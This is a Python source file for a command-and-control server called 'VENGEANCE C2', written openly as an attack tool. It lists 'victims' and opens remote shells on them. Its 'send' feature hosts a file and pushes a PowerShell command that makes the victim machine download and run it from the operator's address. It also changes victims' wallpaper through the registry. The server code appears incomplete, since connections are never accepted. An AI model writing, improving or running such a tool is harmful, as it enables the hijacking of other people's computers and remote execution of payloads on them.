import socket
import threading
import time
import sys
import os
import http.server
import socketserver
from pathlib import Path

HOST = '0.0.0.0'
PORT = 4444

clients = {}
lock = threading.Lock()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def type_effect(text, delay=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def print_banner():
    clear()
    banner = r"""
 ██▒   █▓▓█████  ███▄    █   ▄████ ▓█████  ███▄    █  ▄████▄  ▓█████ 
▓██░   █▒▓█   ▀  ██ ▀█   █  ██▒ ▀█▒▓█   ▀  ██ ▀█   █ ▒██▀ ▀█  ▓█   ▀ 
 ▓██  █▒░▒███   ▓██  ▀█ ██▒▒██░▄▄▄░▒███   ▓██  ▀█ ██▒▒▓█    ▄ ▒███   
  ▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒▒▓▓▄ ▄██▒▒▓█  ▄ 
   ▒▀█░  ░▒████▒▒██░   ▓██░░▒▓███▀▒░▒████▒▒██░   ▓██░▒ ▓███▀ ░░▒████▒
   ░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒  ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ░▒ ▒  ░░░ ▒░ ░
   ░ ░░   ░ ░  ░░ ░░   ░ ▒░  ░   ░  ░ ░  ░░ ░░   ░ ▒░  ░  ▒    ░ ░  ░
     ░░     ░      ░   ░ ░ ░ ░   ░    ░      ░   ░ ░ ░           ░   
      ░     ░  ░         ░       ░    ░  ░         ░ ░ ░         ░  ░
     ░                                               ░               
    """
    print("\033[91m" + banner + "\033[0m")
    type_effect("                  [ VENGEANCE C2 v1.2 ] - Control Panel", 0.03)

def list_victims():
    with lock:
        if not clients:
            print("\033[93mNo victims connected.\033[0m")
            return None
        print("\n\033[92m=== CONNECTED VICTIMS ===\033[0m")
        for i, (sock, name) in enumerate(clients.items(), 1):
            print(f"  \033[96m{i}.\033[0m {name}")
        print("\033[92m=========================\033[0m")
        return list(clients.keys())

def send_file_and_run(victim_socket, filepath):
    path = Path(filepath)
    if not path.exists():
        print(f"\033[91mFile not found: {filepath}\033[0m")
        return
    
    filename = path.name
    folder = path.parent
    
    try:
        # Temporarily change directory to where the file is
        original_dir = os.getcwd()
        os.chdir(folder)
        
        handler = http.server.SimpleHTTPRequestHandler
        with socketserver.TCPServer(("", 8080), handler) as httpd:
            print(f"\033[93mHosting {filename} on http://192.168.4.123:8080 ...\033[0m")
            
            cmd = f'powershell -c "Invoke-WebRequest -Uri \'http://192.168.4.123:8080/{filename}\' -OutFile \'$env:TEMP\\{filename}\'; Start-Process \'$env:TEMP\\{filename}\'"'
            
            victim_socket.sendall(cmd.encode('utf-8'))
            print(f"\033[92m[+] Successfully sent and executed: {filename}\033[0m")
            
            time.sleep(4)  # Give time to download
            
        os.chdir(original_dir)  # Go back to original folder
        
    except Exception as e:
        print(f"\033[91mFailed to send file: {e}\033[0m")
        os.chdir(original_dir)

def change_wallpaper(victim_socket, image_url):
    cmd = f'powershell -c "Invoke-WebRequest -Uri \'{image_url}\' -OutFile \'$env:TEMP\\vengeance.jpg\'; reg add \\"HKCU\\Control Panel\\Desktop\\" /v Wallpaper /t REG_SZ /d \\"%TEMP%\\vengeance.jpg\\" /f; rundll32.exe user32.dll,UpdatePerUserSystemParameters"'
    victim_socket.sendall(cmd.encode('utf-8'))
    print("\033[92m[+] Wallpaper change sent!\033[0m")

def victim_shell(victim_socket, victim_name):
    clear()
    print(f"\033[91m=== VENGEANCE SHELL → {victim_name} ===\033[0m")
    print("Special commands: send <file_or_path>, wallpaper <url>, back\n")
    
    while True:
        try:
            shell_cmd = input(f"\033[96m{victim_name}\033[0m $> ").strip()
            
            if shell_cmd.lower() == 'back':
                return
            if not shell_cmd:
                continue

            if shell_cmd.startswith('send '):
                filepath = shell_cmd[5:].strip()
                send_file_and_run(victim_socket, filepath)
                continue

            if shell_cmd.startswith('wallpaper '):
                url = shell_cmd[10:].strip()
                if url.startswith('http'):
                    change_wallpaper(victim_socket, url)
                else:
                    print("Usage: wallpaper https://example.com/image.jpg")
                continue

            # Normal command
            victim_socket.sendall(shell_cmd.encode('utf-8'))

            output = ""
            while True:
                chunk = victim_socket.recv(8192).decode('utf-8', errors='ignore')
                output += chunk
                if "END_OF_COMMAND" in chunk or len(chunk) < 8192:
                    break
            clean_output = output.replace("END_OF_COMMAND", "").strip()
            if clean_output:
                print(clean_output)
        except:
            print("\033[91mConnection lost.\033[0m")
            return

# Server and main menu (same as before)
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(20)
    print("\033[92m[+] VENGEANCE C2 Started on port 4444\033[0m")

def main_menu():
    while True:
        try:
            cmd = input("\n\033[91mvengeance\033[0m > ").strip().lower()

            if cmd in ['list', 'victims']:
                list_victims()
                continue
            if cmd in ['clear', 'cls']:
                print_banner()
                continue
            if cmd in ['help', '?']:
                print("\033[93mType a number to select victim. Inside shell: send <file>, wallpaper <url>\033[0m")
                continue
            if cmd in ['exit', 'quit']:
                print("\033[91mShutting down...\033[0m")
                sys.exit(0)

            if cmd.isdigit():
                try:
                    index = int(cmd) - 1
                    with lock:
                        victim_list = list(clients.keys())
                        if 0 <= index < len(victim_list):
                            victim_socket = victim_list[index]
                            victim_name = clients[victim_socket]
                            victim_shell(victim_socket, victim_name)
                            print_banner()
                except:
                    pass
        except:
            pass

if __name__ == "__main__":
    print_banner()
    threading.Thread(target=start_server, daemon=True).start()
    time.sleep(1)
    print("\033[93mType 'help' for info\033[0m")
    main_menu()
